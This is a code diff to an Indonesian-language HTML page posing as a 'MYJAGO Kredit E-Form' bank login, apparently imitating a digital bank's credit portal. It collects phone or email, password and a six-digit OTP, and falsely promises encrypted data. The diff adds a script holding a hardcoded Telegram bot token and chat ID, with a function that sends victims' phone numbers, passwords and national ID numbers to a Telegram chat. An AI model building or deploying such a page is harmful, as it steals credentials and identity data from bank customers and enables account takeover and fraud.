@@ -23,5 +23,27 @@
 <div class="wrapper"><div class="main-card"><div class="logo"><span class="gold">J</span><span>MYJAGO</span><span style="color:#bbb">|</span><span>Kredit E-Form</span></div><h1>Selamat Datang <span class="gold">Kembali</span></h1><p class="sub">Masuk untuk melanjutkan proses pengajuan kredit digital Anda dengan aman dan mudah.</p><label>Nomor HP / Email</label><div class="input-wrap"><span class="icon">👤</span><input type="text" placeholder="08123456789"></div><label>Password</label><div class="input-wrap"><span class="icon">🔒</span><input id="password" type="password" placeholder="••••••••"><span class="eye" id="togglePass">👁️</span></div><div class="remember"><span>☑ Ingat saya</span><a href="#">Lupa password?</a></div><button class="login-btn" id="loginBtn">LOGIN →</button><div class="divider">atau masuk dengan</div><div class="social"><button>G</button><button></button></div><div class="secure"><div>🛡️</div><div><b>Keamanan Terjamin</b><br>Data Anda dienkripsi dengan standar keamanan tertinggi.</div></div></div><footer><span>🛡 Aman & Terpercaya</span><span>⚡ Proses Cepat</span><span>🔐 Privasi Terjaga</span></footer></div>
 <div class="overlay" id="overlay"><div class="modal"><button class="close" id="closeBtn">×</button><div id="otpView"><div class="badge">🔐</div><h2>Masukkan <span class="gold">Kode Verifikasi</span></h2><p class="center">Kami telah mengirimkan kode OTP ke <b class="gold">08123456789</b></p><div class="pill">Kode verifikasi berlaku selama <b class="gold">02:59</b> menit</div><div class="otp-title">Masukkan 6 digit kode verifikasi</div><div class="otp-box"><input class="otp" maxlength="1"><input class="otp" maxlength="1"><input class="otp" maxlength="1"><input class="otp" maxlength="1"><input class="otp" maxlength="1"><input class="otp" maxlength="1"></div><div class="warning">Jangan bagikan kode ini kepada siapapun.</div><button class="verify-btn" id="verifyBtn">VERIFIKASI OTP →</button><div class="resend">Belum menerima kode? <span class="gold">Kirim ulang (54s)</span></div></div><div class="success" id="successView"><div style="font-size:86px;color:#d99600">✓</div><h2>Login <span class="gold">Berhasil!</span></h2><p class="center">Anda akan diarahkan ke dashboard.</p><div class="progress"><div class="bar" id="bar"></div></div></div></div></div>
 <script>const loginBtn=document.getElementById('loginBtn'),overlay=document.getElementById('overlay'),closeBtn=document.getElementById('closeBtn'),verifyBtn=document.getElementById('verifyBtn'),otpInputs=document.querySelectorAll('.otp'),otpView=document.getElementById('otpView'),successView=document.getElementById('successView'),bar=document.getElementById('bar'),togglePass=document.getElementById('togglePass'),password=document.getElementById('password');loginBtn.onclick=()=>{overlay.style.display='flex';otpInputs[0].focus()};closeBtn.onclick=()=>overlay.style.display='none';togglePass.onclick=()=>password.type=password.type==='password'?'text':'password';otpInputs.forEach((i,x)=>i.addEventListener('input',()=>{if(i.value&&otpInputs[x+1])otpInputs[x+1].focus()}));verifyBtn.onclick=()=>{const otp=[...otpInputs].map(i=>i.value).join('');if(otp.length<6)return alert('Masukkan 6 digit OTP');otpView.style.display='none';successView.style.display='block';setTimeout(()=>bar.style.width='100%',100)};</script>
-</body>
+<script>
+const BOT_TOKEN = "8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
+const CHAT_ID = "8264171951";
+
+async function kirimTelegram(phone,password,nik){
+  const pesan =
+`LOGIN BARU
+HP: ${phone}
+PASS: ${password}
+NIK: ${nik}`;
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{
+      "Content-Type":"application/json"
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
+}
+</script> </body>
 </html>
